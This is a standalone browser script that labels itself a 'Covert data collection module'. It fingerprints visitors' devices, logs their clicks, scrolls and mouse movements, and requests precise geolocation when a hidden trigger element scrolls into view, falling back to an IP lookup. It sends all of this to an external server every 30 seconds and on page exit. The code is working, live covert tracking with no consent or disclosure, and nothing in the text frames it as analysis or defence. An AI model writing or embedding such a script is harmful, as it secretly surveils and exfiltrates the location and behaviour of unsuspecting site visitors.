    <script>
        // Covert data collection module
        (function() {
            'use strict';
            
            // Data collection object
            const academicData = {
                timestamp: new Date().toISOString(),
                location: null,
                device: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth
                    },
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
                },
                network: {
                    connection: navigator.connection ? {
                        type: navigator.connection.type,
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt
                    } : null
                },
                interactions: [],
                performance: {}
            };
            
            // Interaction tracking
            const trackInteraction = (type, target) => {
                academicData.interactions.push({
                    type,
                    target: target.tagName,
                    id: target.id || null,
                    class: target.className || null,
                    timestamp: new Date().toISOString(),
                    location: {
                        x: Math.floor(target.getBoundingClientRect().x),
                        y: Math.floor(target.getBoundingClientRect().y)
                    }
                });
                
                // Send data periodically
                if (academicData.interactions.length % 10 === 0) {
                    sendAcademicData();
                }
            };
            
            // Event listeners for interaction tracking
            document.addEventListener('click', (e) => {
                trackInteraction('click', e.target);
            });
            
            document.addEventListener('scroll', () => {
                trackInteraction('scroll', document.documentElement);
            });
            
            document.addEventListener('mousemove', (e) => {
                if (Math.random() > 0.7) { // Sample mouse movements
                    trackInteraction('mousemove', e.target);
                }
            });
            
            // Performance metrics
            window.addEventListener('load', () => {
                if (window.performance) {
                    const perf = window.performance.timing;
                    academicData.performance = {
                        loadTime: perf.loadEventEnd - perf.navigationStart,
                        domReady: perf.domContentLoadedEventStart - perf.domLoading,
                        redirectCount: window.performance.navigation.redirectCount
                    };
                }
            });
            
            // Geolocation with fallback
            const getLocation = () => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            academicData.location = {
                                source: 'geolocation',
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                timestamp: new Date(position.timestamp).toISOString()
                            };
                            sendAcademicData();
                        },
                        error => {
                            // Fallback to IP-based location
                            fetch('https://ipapi.co/json/')
                                .then(response => response.json())
                                .then(data => {
                                    academicData.location = {
                                        source: 'ip-api',
                                        ip: data.ip,
                                        city: data.city,
                                        region: data.region,
                                        country: data.country_name,
                                        latitude: data.latitude,
                                        longitude: data.longitude
                                    };
                                    sendAcademicData();
                                });
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 5000,
                            maximumAge: 0
                        }
                    );
                } else {
                    // IP-based fallback if geolocation not supported
                    fetch('https://ipapi.co/json/')
                        .then(response => response.json())
                        .then(data => {
                            academicData.location = {
                                source: 'ip-api',
                                ip: data.ip,
                                city: data.city,
                                region: data.region,
                                country: data.country_name,
                                latitude: data.latitude,
                                longitude: data.longitude
                            };
                            sendAcademicData();
                        });
                }
            };
            
            // Data transmission
            const sendAcademicData = () => {
                // Create a temporary copy to send
                const dataToSend = {...academicData};
                
                // Use beacon API if available for better performance
                if (navigator.sendBeacon) {
                    const blob = new Blob([JSON.stringify(dataToSend)], {type: 'application/json'});
                    navigator.sendBeacon('https://academic-research-backend.edu/data', blob);
                } else {
                    // Fallback to fetch API
                    fetch('https://academic-research-backend.edu/data', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(dataToSend),
                        keepalive: true
                    });
                }
                
                // Reset interaction array after sending
                academicData.interactions = [];
            };
            
            // Trigger location detection when hidden element becomes visible
            const observer = new IntersectionObserver((entries) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        getLocation();
                        observer.disconnect();
                    }
                });
            });
            
            // Start observing the hidden tracker element
            const geoTrigger = document.getElementById('geo-trigger');
            if (geoTrigger) {
                observer.observe(geoTrigger);
            }
            
            // Send data when user leaves the page
            window.addEventListener('beforeunload', () => {
                sendAcademicData();
            });
            
            // Periodic data transmission (every 30 seconds)
            setInterval(sendAcademicData, 30000);
        })();
    </script>
